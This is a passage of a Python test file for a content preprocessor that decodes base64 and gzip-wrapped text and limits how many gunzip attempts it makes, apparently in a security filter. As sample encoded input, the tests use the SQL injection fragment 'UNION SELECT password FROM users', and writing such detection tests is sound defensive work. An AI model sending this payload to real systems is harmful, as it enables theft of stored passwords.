    assert result == "UNION SELECT password FROM users"


def test_decode_base64_candidates_falls_back_when_gunzip_fails() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    corrupt = preprocessor._GZIP_MAGIC + b"\x00" * 30
    token = base64.b64encode(corrupt).decode()

    result = preprocessor._decode_base64_candidates(token, [1])

    assert result == token


def test_decode_base64_candidates_skips_gunzip_when_budget_exhausted() -> None:
    import base64
    import gzip

    preprocessor = ContentPreprocessor()
    token = base64.b64encode(
        gzip.compress(b"UNION SELECT password FROM users")
    ).decode()

    result = preprocessor._decode_base64_candidates(token, [0])

    assert result == token


async def test_decode_common_encodings_shares_gunzip_budget_across_iterations() -> None:
    import base64
    import gzip

    preprocessor = ContentPreprocessor()
    chunk = base64.b64encode(gzip.compress(b"x" * 900)).decode()
    content = " ".join([chunk] * 20)

    result = await preprocessor.decode_common_encodings(content)

    assert result.count("x" * 900) <= preprocessor._MAX_GUNZIP_ATTEMPTS_PER_PASS
